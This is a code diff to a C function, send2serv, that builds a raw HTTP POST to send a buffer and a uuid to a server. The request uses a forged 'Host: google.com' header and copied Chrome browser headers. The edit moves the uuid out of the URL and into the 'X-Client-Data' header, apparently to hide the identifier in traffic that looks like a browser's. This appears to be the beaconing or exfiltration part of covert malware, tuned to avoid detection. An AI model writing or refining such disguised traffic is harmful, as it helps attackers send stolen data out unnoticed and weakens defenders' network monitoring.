@@ -24,7 +24,7 @@ int send2serv(const char *uuid, const char *buf, size_t len) {
     //Only things that matter are the uuid and the content-length. I've tested it and it doens't work without content-length
     char header_buffer[1024];
     int header_len = snprintf(header_buffer, sizeof(header_buffer),
-        "POST /login?uuid=%s HTTP/1.1\r\n"
+        "POST /login? HTTP/1.1\r\n"
         "Host: google.com\r\n"
         "Accept-Language: en-US,en;q=0.\r\n"
         "Upgrade-Insecure-Requests: 1\r\n"
@@ -32,7 +32,7 @@ int send2serv(const char *uuid, const char *buf, size_t len) {
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
         "Content-Length: %lu\r\n"
         "Sec-Ch-Ua-Mobile: ?0\r\n"
-        "X-Client-Data: CNGLywE=\r\n"
+        "X-Client-Data: %s\r\n"
         "Sec-Fetch-Site: none\r\n"
         "Sec-Fetch-Mode: navigate\r\n"
         "Sec-Fetch-User: ?1\r\n"
@@ -40,7 +40,7 @@ int send2serv(const char *uuid, const char *buf, size_t len) {
         "Accept-Encoding: gzip, deflate, br\r\n"
         "Priority: u=0, i\r\n"
         "Connection: keep-alive\r\n\r\n",
-        uuid, len);
+        len, uuid);
 
     if (header_len <= 0 || header_len >= sizeof(header_buffer)) {
         return -1;
